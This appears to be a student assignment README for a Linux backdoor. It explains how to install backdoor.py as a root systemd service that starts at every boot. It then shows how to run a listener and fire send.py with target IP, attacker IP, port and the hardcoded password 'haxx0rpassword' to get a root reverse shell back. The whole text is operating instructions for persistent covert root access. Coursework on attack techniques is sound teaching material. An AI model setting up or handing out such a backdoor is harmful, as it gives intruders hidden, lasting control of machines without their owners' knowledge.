Backdoor (Aufgabe 3)

To install the backdoor, just run the script ./install.sh like:

    sudo ./install.sh
    please run as root.

The script will copy the backdoor.py script to /bin,
copy backdor.service to the systemd folder and enable the service,
so the script always runs automatically when the machine boot.

For testing, you can just run it like:

    sudo python backdoor.py

And the backdoor should be working.

To exploit the backdoor, first choose a port. For my examples, I'll
be using port 3600.

Then, run the listener.sh, that will listen to the port waiting to
receive the reverse shell:

    sudo ./listener.sh 3600
    please run as root

After that, while the listener is running, you have to send a
message to the backdoor informing it that you are expection the
backdoor in that port.
You should do this by using the provided send.py script like:

    sudo python send.py target_machine_ip your_machine_ip port password

For Example:

    sudo python send.py 10.0.23.31 10.0.24.14 3600 haxx0rpassword

The password that the backdoor uses is haxx0rpassword, just like the example.

This should provide the reverse shell authenticated as root to the listener.
